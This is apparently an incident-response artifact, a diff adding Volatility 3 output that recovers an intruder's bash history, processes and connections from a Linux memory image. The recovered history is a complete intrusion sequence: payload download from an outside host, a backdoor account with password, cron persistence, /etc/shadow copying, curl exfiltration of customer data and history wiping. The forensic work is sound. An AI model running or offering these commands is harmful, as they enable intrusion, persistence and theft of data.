@@ -1,0 +1,39 @@
+# vol -f /tmp/memory.lime linux.bash
+# Run on analysis host 2026-05-14T03:38:11Z by IR responder.
+# Volatility 3 v2.7.0; ISF: ubuntu-24.04-generic-6.8.0-31.
+#
+# Output recovers bash command history from the heap of every running
+# bash process at acquisition time. Lines below are presented as the
+# Volatility plugin emitted them (PID  TASK  CMD  TIME  COMMAND).
+PID      TASK             CMD              TIME                          COMMAND
+8438     bash             bash             2026-05-14 02:47:35.000000    id
+8438     bash             bash             2026-05-14 02:47:38.000000    whoami
+8438     bash             bash             2026-05-14 02:47:42.000000    hostname
+8438     bash             bash             2026-05-14 02:47:47.000000    ls -la /home
+8438     bash             bash             2026-05-14 02:47:54.000000    wget http://198.51.100.7/payload -O /tmp/x
+8438     bash             bash             2026-05-14 02:47:55.000000    chmod +x /tmp/x
+8438     bash             bash             2026-05-14 02:47:56.000000    mv /tmp/x /tmp/.x
+8438     bash             bash             2026-05-14 02:48:02.000000    useradd -m -s /bin/bash -u 1099 support
+8438     bash             bash             2026-05-14 02:48:14.000000    echo 'support:Crunch4ever!' | chpasswd
+8438     bash             bash             2026-05-14 02:48:33.000000    echo '*/5 * * * * /tmp/.x' | crontab -u support -
+8438     bash             bash             2026-05-14 02:49:01.000000    chattr +i /tmp/.x
+8438     bash             bash             2026-05-14 02:49:15.000000    cat /etc/shadow > /tmp/sh.out
+8438     bash             bash             2026-05-14 02:49:22.000000    tar czf /tmp/d.tar.gz /home/customers/
+8438     bash             bash             2026-05-14 02:49:40.000000    curl -X POST --data-binary @/tmp/d.tar.gz https://198.51.100.7:8443/ -k
+8438     bash             bash             2026-05-14 02:49:55.000000    rm -f /tmp/sh.out /tmp/d.tar.gz
+8438     bash             bash             2026-05-14 02:50:01.000000    history -c
+8438     bash             bash             2026-05-14 02:50:03.000000    rm ~/.bash_history
+8438     bash             bash             2026-05-14 02:50:05.000000    exit
+
+# Companion strings from `vol -f /tmp/memory.lime linux.pslist`:
+#   PID  PPID  COMM      STATE   USER  ARGV
+#   8430 1     sshd      S       root  sshd: deploy [priv]
+#   8432 8430  sshd      S       1003  sshd: deploy@pts/0
+#   8438 8432  bash      S       1003  -bash
+#   8612 1     cron      S       0     /usr/sbin/cron -f
+#
+# Companion strings from `vol -f /tmp/memory.lime linux.netstat`:
+#   PROTO  LOCAL                    REMOTE                  STATE        PID  COMM
+#   TCP    192.168.42.42:22         198.51.100.7:58180      ESTABLISHED  8430 sshd
+#   TCP    192.168.42.42:48121      198.51.100.7:80         TIME_WAIT    -    -
+#   TCP    192.168.42.42:48122      198.51.100.7:8443       TIME_WAIT    -    -
